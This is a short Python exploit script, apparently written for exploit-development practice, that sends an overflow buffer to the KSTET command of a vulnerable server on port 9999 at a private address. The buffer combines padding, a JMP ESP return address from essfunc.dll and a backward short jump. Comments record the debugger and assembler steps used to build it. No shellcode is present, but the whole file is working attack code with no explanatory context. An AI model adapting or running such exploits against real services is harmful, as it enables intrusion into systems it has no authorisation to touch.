import sys
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#debug breakpoint jmp esp 625011af essfunc.dll
#jump back 60 ##msf-nasm_shell $ESP-60 EB C2

buffer = "KSTET /.:/ " + "A"*65+ "\xaf\x11\x50\x62" + "\xeb\xc2\x90\x90" + "X"*4900
s.connect(('172.16.0.24',9999))
s.recv(1024)
s.send(buffer)
s.close()
